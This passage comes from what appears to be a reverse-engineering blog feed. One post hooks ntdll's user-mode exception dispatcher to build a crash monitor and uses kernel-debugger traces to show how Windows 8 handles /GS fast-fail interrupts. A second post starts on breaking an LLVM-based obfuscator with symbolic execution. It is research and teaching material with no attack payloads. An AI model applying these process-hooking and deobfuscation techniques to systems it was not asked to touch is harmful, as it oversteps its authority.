</span><span class='line'>        <span class="n">push</span>    <span class="n">ecx</span>                     <span class="p">;</span>
</span><span class='line'>        <span class="n">push</span>    <span class="n">ebx</span>                     <span class="p">;</span>
</span><span class='line'>        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">TrueKiUserExceptionDispatcher</span><span class="p">];</span>
</span><span class='line'>        <span class="n">jmp</span>     <span class="n">eax</span>                     <span class="p">;</span>
</span><span class='line'>        <span class="c1">//</span>
</span><span class='line'>        <span class="c1">// The above code should never return.</span>
</span><span class='line'>        <span class="c1">//</span>
</span><span class='line'>        <span class="kt">int</span>     <span class="mi">3</span>                       <span class="p">;</span> <span class="c1">// Break!</span>
</span><span class='line'>        <span class="n">mov</span>     <span class="n">esp</span><span class="p">,</span> <span class="n">ebp</span>                <span class="p">;</span> <span class="c1">// Epilog</span>
</span><span class='line'>        <span class="n">pop</span>     <span class="n">ebp</span>                     <span class="p">;</span>
</span><span class='line'>        <span class="n">ret</span>                             <span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is what looks <em>ntdll!KiUserExceptionDispatcher</em> like in memory after the hook:</p>

<p><img class="center" src="http://doar-e.github.io/images/ntdll.KiUserExceptionDispatcher/hook.png"></p>

<p>Disassembling some instructions pointed by the <em>CONTEXT.Eip</em> field is also really straightforward to do with <em>distorm_decode</em>:</p>

<figure class='code'><figcaption><span>Use distorm3 to disassemble some codes</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">IsBadReadPtr</span><span class="p">((</span><span class="k">const</span> <span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">Context</span><span class="o">-&gt;</span><span class="n">Eip</span><span class="p">,</span> <span class="n">SIZE_BIGGEST_X86_INSTR</span> <span class="o">*</span> <span class="n">MAX_INSTRUCTIONS</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">_DecodeResult</span> <span class="n">res</span><span class="p">;</span>
</span><span class='line'>  <span class="n">_OffsetType</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">Context</span><span class="o">-&gt;</span><span class="n">Eip</span><span class="p">;</span>
</span><span class='line'>  <span class="n">_DecodedInst</span> <span class="n">decodedInstructions</span><span class="p">[</span><span class="n">MAX_INSTRUCTIONS</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">decodedInstructionsCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">res</span> <span class="o">=</span> <span class="n">distorm_decode</span><span class="p">(</span>
</span><span class='line'>      <span class="n">offset</span><span class="p">,</span>
</span><span class='line'>      <span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">Context</span><span class="o">-&gt;</span><span class="n">Eip</span><span class="p">,</span>
</span><span class='line'>      <span class="n">MAX_INSTRUCTIONS</span> <span class="o">*</span> <span class="n">SIZE_BIGGEST_X86_INSTR</span><span class="p">,</span>
</span><span class='line'>      <span class="n">Decode32Bits</span><span class="p">,</span>
</span><span class='line'>      <span class="n">decodedInstructions</span><span class="p">,</span>
</span><span class='line'>      <span class="n">MAX_INSTRUCTIONS</span><span class="p">,</span>
</span><span class='line'>      <span class="o">&amp;</span><span class="n">decodedInstructionsCount</span>
</span><span class='line'>  <span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="n">DECRES_SUCCESS</span> <span class="o">||</span> <span class="n">res</span> <span class="o">==</span> <span class="n">DECRES_MEMORYERR</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">fprintf</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Disassembly:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">decodedInstructionsCount</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">fprintf</span><span class="p">(</span>
</span><span class='line'>        <span class="n">f</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&quot;%.8I64x (%.2d) %-24s %s%s%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">offset</span><span class="p">,</span>
</span><span class='line'>        <span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">size</span><span class="p">,</span>
</span><span class='line'>        <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">instructionHex</span><span class="p">.</span><span class="n">p</span><span class="p">,</span>
</span><span class='line'>        <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">mnemonic</span><span class="p">.</span><span class="n">p</span><span class="p">,</span>
</span><span class='line'>        <span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">operands</span><span class="p">.</span><span class="n">length</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">?</span> <span class="s">&quot; &quot;</span> <span class="o">:</span> <span class="s">&quot;&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">decodedInstructions</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">operands</span><span class="p">.</span><span class="n">p</span>
</span><span class='line'>      <span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So the prototype works pretty great like that.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>D:\Codes\The Sentinel\Release&gt;ProcessSpawner.exe &quot;D:\Codes\The Sentinel\Release\ExceptionMonitorDll.dll&quot; ..\tests\divzero.exe divzero.exe
</span><span class='line'>D:\Codes\The Sentinel\Release&gt;ls -l D:\Crashs\divzero.exe
</span><span class='line'>total 4
</span><span class='line'>-rw-rw-rw-  1 0vercl0k 0 863 2013-10-16 22:58 exceptionaddress_401359pid_2732tick_258597468timestamp_1381957116.txt
</span></code></pre></td></tr></table></div></figure>


<p>But once I&rsquo;ve encountered a behavior that I didn&rsquo;t plan on: there was like a stack-corruption in a stack-frame protected by the <em>/GS</em> cookie. If the cookie has been, somehow, rewritten the program calls <em>___report_gs_failure</em> (sometimes the implementation is directly inlined, thus you can find the definition of the function in your binary) in order to kill the program because the stack-frame is broken. Long story short, I was also hooking <em>kernel32!UnhandleExceptionFilter</em> to not miss that kind of exceptions, but I noticed while writing this post that it doesn&rsquo;t work anymore. We are going to see why in the next part.</p>

<h1>The untold story: Win8 and <em>nt!KiFastFailDispatch</em></h1>

<h2>Introduction</h2>

<p>When I was writing this little post I did also some tests on my personal machine: a Windows 8 host. But the test for the <em>/GS</em> thing we just talked about wasn&rsquo;t working at all as I said. So I started my investigation by looking at the code of <em>__report_gsfailure</em> (generated with a VS2012) and I saw this:</p>

<figure class='code'><figcaption><span>__report_gsfailure</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="n">__usercall</span> <span class="nf">__report_gsfailure</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="o">&lt;</span><span class="n">ebx</span><span class="o">&gt;</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a2</span><span class="o">&lt;</span><span class="n">edi</span><span class="o">&gt;</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a3</span><span class="o">&lt;</span><span class="n">esi</span><span class="o">&gt;</span><span class="p">,</span> <span class="kt">char</span> <span class="n">a4</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// eax@1</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edx@1</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// ecx@1</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [sp-4h] [bp-328h]@1</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [sp+324h] [bp+0h]@0</span>
</span><span class='line'>  <span class="kt">void</span> <span class="o">*</span><span class="n">v13</span><span class="p">;</span> <span class="c1">// [sp+328h] [bp+4h]@3</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v4</span> <span class="o">=</span> <span class="n">IsProcessorFeaturePresent</span><span class="p">(</span><span class="mh">0x17u</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">// [...]</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">v6</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'>    <span class="kr">__asm</span> <span class="p">{</span> <span class="kt">int</span>     <span class="mi">29</span><span class="n">h</span>             <span class="p">;</span> <span class="n">DOS</span> <span class="mi">2</span><span class="o">+</span> <span class="n">internal</span> <span class="o">-</span> <span class="n">FAST</span> <span class="n">PUTCHAR</span> <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="p">[...]</span>
</span><span class='line'>  <span class="n">__raise_securityfailure</span><span class="p">(</span><span class="o">&amp;</span><span class="n">GS_ExceptionPointers</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first thing I asked myself was about that weird <em>int 29h</em>. Next thing I did was to download a fresh Windows 8 VM <a href="http://www.modern.ie/fr-fr/virtualization-tools#downloads">here</a> and attached a kernel debugger in order to check the IDT entry 0x29:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; vertarget
</span><span class='line'>Windows 8 Kernel Version 9200 MP (2 procs) Free x86 compatible
</span><span class='line'>Built by: 9200.16424.x86fre.win8_gdr.120926-1855
</span><span class='line'>Machine Name:
</span><span class='line'>Kernel base = 0x8145c000 PsLoadedModuleList = 0x81647e68
</span><span class='line'>Debug session time: Thu Oct 17 11:30:18.772 2013 (UTC + 2:00)
</span><span class='line'>System Uptime: 0 days 0:02:55.784
</span><span class='line'>kd&gt; !idt 29
</span><span class='line'>
</span><span class='line'>Dumping IDT: 809da400
</span><span class='line'>
</span><span class='line'>29: 8158795c nt!KiRaiseSecurityCheckFailure
</span></code></pre></td></tr></table></div></figure>


<p>As opposed I was used to see on my Win7 machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; vertarget
</span><span class='line'>Windows 7 Kernel Version 7600 MP (1 procs) Free x86 compatible
</span><span class='line'>Product: WinNt, suite: TerminalServer SingleUserTS
</span><span class='line'>Built by: 7600.16385.x86fre.win7_rtm.090713-1255
</span><span class='line'>Machine Name:
</span><span class='line'>Kernel base = 0x84646000 PsLoadedModuleList = 0x8478e810
</span><span class='line'>Debug session time: Thu Oct 17 14:25:40.969 2013 (UTC + 2:00)
</span><span class='line'>System Uptime: 0 days 0:00:55.203
</span><span class='line'>kd&gt; !idt 29
</span><span class='line'>
</span><span class='line'>Dumping IDT: 80b95400
</span><span class='line'>
</span><span class='line'>29: 00000000
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve opened my favorite IDE and I wrote a bit of code to test if there was a different behavior between Win7 and Win8 regarding this exception handling:</p>

<figure class='code'><figcaption><span>gs.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;windows.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kr">__try</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="kr">__asm</span> <span class="kt">int</span> <span class="mh">0x29</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="kr">__except</span><span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;SEH catched the exception!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>On Win7 I&rsquo;m able to catch the exception via a SEH handler: it means the Windows kernel calls the user mode exception dispatcher for further processing by the user exception handlers (as we saw at the beginning of the post). But on Win8, at my surprise, I don&rsquo;t get the message ; the process is killed directly after displaying the usual message box &ldquo;a program has stopped&rdquo;. Definitely weird.</p>

<h2>What happens on Win7</h2>

<p>When the interruption 0x29 is triggered by my code, the CPU is going to check if there is an IDT entry for that interruption, and if there isn&rsquo;t it&rsquo;s going to raise a #GP (<em>nt!KiTrap0d</em>) that will end up in <em>nt!KiDispatchException</em>.</p>

<p>And as previously, the function is going to check where the fault happened and because it happened in userland it will modify the trap frame structure to reach <em>ntdll!KiUserExceptionDispatcher</em>. That&rsquo;s why we can catch it in our <em>__except</em> scope.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>kd&gt; r
</span><span class='line'>eax=0000000d ebx=86236d40 ecx=862b48f0 edx=0050e600 esi=00000000 edi=0029b39f
</span><span class='line'>eip=848652dd esp=9637fd34 ebp=9637fd34 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
</span><span class='line'>nt!KiTrap0D+0x471:
</span><span class='line'>848652dd e80ddeffff      call    nt!CommonDispatchException+0x123 (848630ef)
</span><span class='line'>kd&gt; k 2
</span><span class='line'>ChildEBP RetAddr
</span><span class='line'>9637fd34 0029b39f nt!KiTrap0D+0x471
</span><span class='line'>0016fc1c 0029be4c gs+0x2b39f
</span><span class='line'>kd&gt; u gs+0x2b39f l1
</span><span class='line'>gs+0x2b39f:
</span><span class='line'>0029b39f cd29            int     29h
</span></code></pre></td></tr></table></div></figure>


<h2>What happens on Win8</h2>

<p>This time the kernel has defined an ISR for the interruption 0x29: <em>nt!KiRaiseSecurityCheckFailure</em>. This function is going to call <em>nt!KiFastFailDispatch</em>, and this one is going to call <em>nt!KiDispatchException</em>:</p>

<p><img class="center" src="http://doar-e.github.io/images/ntdll.KiUserExceptionDispatcher/kifastfaildispatch.png"></p>

<p>BUT the exception is going to be processed as a <strong>second-chance</strong> exception because of the way <em>nt!KiFastFailDispatch</em> calls the kernel mode exception dispatcher. And if we look at the source of <em>nt!KiDispatchException</em> in ReactOS we can see that this exception won&rsquo;t have the chance to reach back the userland as in Win7 :)):</p>

<figure class='code'><figcaption><span>KiDispatchException from ReactOS</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">VOID</span>
</span><span class='line'><span class="n">NTAPI</span>
</span><span class='line'><span class="nf">KiDispatchException</span><span class="p">(</span><span class="n">IN</span> <span class="n">PEXCEPTION_RECORD</span> <span class="n">ExceptionRecord</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">IN</span> <span class="n">PKEXCEPTION_FRAME</span> <span class="n">ExceptionFrame</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">IN</span> <span class="n">PKTRAP_FRAME</span> <span class="n">TrapFrame</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">IN</span> <span class="n">KPROCESSOR_MODE</span> <span class="n">PreviousMode</span><span class="p">,</span>
</span><span class='line'>                    <span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">FirstChance</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">CONTEXT</span> <span class="n">Context</span><span class="p">;</span>
</span><span class='line'>    <span class="n">EXCEPTION_RECORD</span> <span class="n">LocalExceptRecord</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// [...]</span>
</span><span class='line'>    <span class="cm">/* Handle kernel-mode first, it&#39;s simpler */</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">PreviousMode</span> <span class="o">==</span> <span class="n">KernelMode</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'><span class="c1">// [...]</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="cm">/* User mode exception, was it first-chance? */</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">FirstChance</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'><span class="c1">// [...]</span>
</span><span class='line'><span class="c1">// that&#39;s in this branch the kernel reaches back to the user mode exception dispatcher</span>
</span><span class='line'><span class="c1">// but if FirstChance=0, we won&#39;t have that chance</span>
</span><span class='line'>
</span><span class='line'>          <span class="cm">/* Set EIP to the User-mode Dispatcher */</span>
</span><span class='line'>          <span class="n">TrapFrame</span><span class="o">-&gt;</span><span class="n">Eip</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">KeUserExceptionDispatcher</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>          <span class="cm">/* Dispatch exception to user-mode */</span>
</span><span class='line'>          <span class="n">_SEH2_YIELD</span><span class="p">(</span><span class="k">return</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* Try second chance */</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">DbgkForwardException</span><span class="p">(</span><span class="n">ExceptionRecord</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="cm">/* Handled, get out */</span>
</span><span class='line'>            <span class="k">return</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">DbgkForwardException</span><span class="p">(</span><span class="n">ExceptionRecord</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="cm">/* Handled, get out */</span>
</span><span class='line'>            <span class="k">return</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'><span class="c1">// [...]</span>
</span><span class='line'>    <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>To convince yourself you can even modify the <em>FirstChance</em> argument passed to <em>nt!KiDispatchException</em> from <em>nt!KiFastFailDispatch</em>. You will see the SEH handler is called like in Win7:</p>

<p><img class="center" src="http://doar-e.github.io/images/ntdll.KiUserExceptionDispatcher/win8.png"></p>

<p>Cool, we have now our answer to the weird behavior! I guess if you want to monitor <em>/GS</em> exception you are going to find another trick :)).</p>

<h1>Conclusion</h1>

<p>I hope you enjoyed this little trip in the Windows&#8217; exception world both in user and kernel mode. You will find the seems-to-be-working PoC on my github account here: <a href="https://github.com/0vercl0k/stuffz/tree/master/The%20Sentinel">The sentinel</a>. By the way, you are highly encouraged to improve it, or to modify it in order to suit your use-case!</p>

<p>If you liked the subject of the post, I&rsquo;ve made a list of really cool/interesting links you should check out:</p>

<ul>
<li><a href="http://www.alex-ionescu.com/?p=69">New Security Assertions in Windows 8</a> &ndash; <a href="https://twitter.com/aionescu">@aionescu</a> endless source of inspiration</li>
<li><a href="http://www.uninformed.org/?v=4&amp;a=5&amp;t=txt">Exploiting the Otherwise Unexploitable on Windows</a> &ndash; Yet another awesome article by <a href="http://www.nynaeve.net/">Skywing</a> and <a href="http://uninformed.org/">skape</a></li>
<li><a href="http://www.nynaeve.net/?p=201">A catalog of NTDLL kernel mode to user mode callbacks, part 2: KiUserExceptionDispatcher</a></li>
<li><a href="http://dralu.com/?p=167">Windows Exceptions, Part II: Exception Dispatching</a></li>
<li><a href="https://easyhook.codeplex.com/">EasyHook</a> &ndash; &ldquo;EasyHook starts where Microsoft Detours ends.&rdquo;</li>
</ul>


<p>High five to my friend <a href="https://twitter.com/Ivanlef0u">@Ivanlef0u</a> for helping me to troubleshoot the weird behavior, and <a href="https://twitter.com/__x86">@__x86</a> for the review!</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Breaking Kryptonite's obfuscation: a static analysis approach relying on symbolic execution]]></title>
    <link href="http://doar-e.github.io/blog/2013/09/16/breaking-kryptonites-obfuscation-with-symbolic-execution/"/>
    
    <updated>2013-09-16T11:47:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2013/09/16/breaking-kryptonites-obfuscation-with-symbolic-execution</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p><em>Kryptonite</em> was a proof-of-concept I built to obfuscate codes at the LLVM intermediate representation level. The idea was to use semantic-preserving transformations in order to not break the original program. One of the main idea was for example to build a home-made 32 bits adder to replace the <em>add</em> LLVM instruction. Instead of having a single asm instruction generated at the end of the pipeline, you will end up with a ton of assembly codes doing only an addition. If you never read my article, and you are interested in it here it is: <a href="http://0vercl0k.tuxfamily.org/bl0g/?p=260">Obfuscation of steel: meet my Kryptonite</a>.</p>

<p><img class="center" src="http://doar-e.github.io/images/breaking_kryptonite_s_obfuscation_with_symbolic_execution/home-made-adder.png"></p>

<p>In this post I wanted to show you how we can manage to break that obfuscation with symbolic execution. We are going to write a really tiny symbolic execution engine with IDAPy, and we will use Z3Py to simplify all our equations. Note that a friend of mine <a href="https://twitter.com/elvanderb">@elvanderb</a> used a similar approach (more generic though) to simplify some parts of the <a href="http://download.tuxfamily.org/overclokblog/Obfuscation%20of%20steel%3a%20meet%20my%20Kryptonite/binaries/">crackme</a> ; but he didn&rsquo;t wanted to publish it, so here is my blog post about it!</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>The target</h1>

<p>In this blogpost we are first going to work on the LLVM code emitted by <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/llvm-cpp-frontend-home-made-32bits-adder.cpp">llvm-cpp-frontend-home-made-32bits-adder.cpp</a>. Long story short, the code uses the LLVM frontend API to emit a home made 32 bits adder in the <a href="http://llvm.org/docs/LangRef.html">LLVM intermediate language</a>. You can then feed the output directly to clang to generate a real executable binary for your platform, I chose to work only on the x86 platform here. I&rsquo;ve also uploaded the binary here: <a href="https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/adder">adder</a>.</p>

<p>So if you open the generated binary in IDA, you will see an interminable routine that only does an addition. At first glance, it really is kind of scary:</p>

<ul>
<li>every instructions seems to be important, there is no junk codes</li>
<li>it seems that only binary operations are used: addition, left shift, right shift, xor, etc.</li>
<li>it&rsquo;s also a two thousands instructions routine</li>
</ul>


<p>The idea in this post is to write a very basic symbolic execution engine in order to see what kind of result will hold the EAX register at the end of the routine. Hopefully, we will obtain something highly simplified and more readable that this bunch of assembly codes!</p>

<h1>The symbolic execution engine approach</h1>

<p>But in fact that piece of code makes it <strong>really</strong> easy for us to write a symbolic execution engine. Here are the main reasons:</p>

<ul>
<li>there is no branches, no loops, perfect.</li>
